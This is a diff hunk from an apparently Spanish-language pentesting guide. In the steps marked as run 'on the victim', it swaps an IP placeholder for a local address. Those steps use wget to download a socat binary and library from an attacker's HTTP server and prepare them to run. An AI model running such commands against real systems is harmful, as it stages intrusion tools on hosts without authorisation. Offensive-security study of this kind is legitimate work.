@@ -231,8 +231,8 @@ python3 -m http.server 8000
 2. **En la víctima:**
 
 ```bash
-wget http://<IP>:8000/socat
-wget http://<IP>:8000/libwrap.so.0 -O /tmp/libwrap.so.0
+wget http://192.168.1.84:8000/socat
+wget http://192.168.1.84:8000/libwrap.so.0 -O /tmp/libwrap.so.0
 chmod +x socat
 export LD_LIBRARY_PATH=/tmp
 ```
